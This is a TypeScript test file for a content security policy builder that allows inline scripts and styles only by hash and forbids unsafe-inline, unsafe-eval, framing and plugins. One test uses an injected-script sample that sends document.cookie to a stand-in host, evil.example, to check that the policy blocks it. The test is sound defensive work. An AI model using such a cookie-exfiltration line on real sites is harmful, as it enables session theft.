import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import { buildContentSecurityPolicy, inlineBlocks, sha256Source } from "../src/csp";

const html = `<!doctype html><html><head><style>body{margin:0}</style>
<script>console.log("theme")</script></head><body>
<script>console.log("splash")</script></body></html>`;

function sourcesFor(policy: string, directive: string): string[] {
  const part = policy.split("; ").find((p) => p.startsWith(directive + " "));
  return part ? part.slice(directive.length + 1).split(" ") : [];
}

describe("content security policy", () => {
  it("allows exactly the inline blocks it was built from, by hash", () => {
    const { scripts, styles } = inlineBlocks(html);
    const policy = buildContentSecurityPolicy(scripts, styles);
    for (const script of scripts)
      expect(sourcesFor(policy, "script-src")).toContain(sha256Source(script));
    for (const style of styles)
      expect(sourcesFor(policy, "style-src")).toContain(sha256Source(style));
  });

  it("never allows unsafe-inline or unsafe-eval", () => {
    const { scripts, styles } = inlineBlocks(html);
    const policy = buildContentSecurityPolicy(scripts, styles);
    expect(policy).not.toContain("unsafe-inline");
    expect(policy).not.toContain("unsafe-eval");
  });

  it("does not allow an injected inline script, because its hash is not in the policy", () => {
    const { scripts, styles } = inlineBlocks(html);
    const policy = buildContentSecurityPolicy(scripts, styles);
    const injected = 'fetch("https://evil.example/?c="+document.cookie)';
    expect(sourcesFor(policy, "script-src")).not.toContain(sha256Source(injected));
  });

  it("forbids framing and plugin content", () => {
    const { scripts, styles } = inlineBlocks(html);
    const policy = buildContentSecurityPolicy(scripts, styles);
    expect(policy).toContain("frame-ancestors 'none'");
    expect(policy).toContain("object-src 'none'");
  });

  it("the hashes match the bytes of the real built page, so the app is not broken by the policy", () => {
    const real = readFileSync("/home/gin/work/lacrous/OmniCloud/apps/web/dist/index.html", "utf8");
    const { scripts, styles } = inlineBlocks(real);
    const policy = buildContentSecurityPolicy(scripts, styles);
    for (const script of scripts)
      expect(sourcesFor(policy, "script-src")).toContain(sha256Source(script));
    for (const style of styles)
      expect(sourcesFor(policy, "style-src")).toContain(sha256Source(style));
  });
});
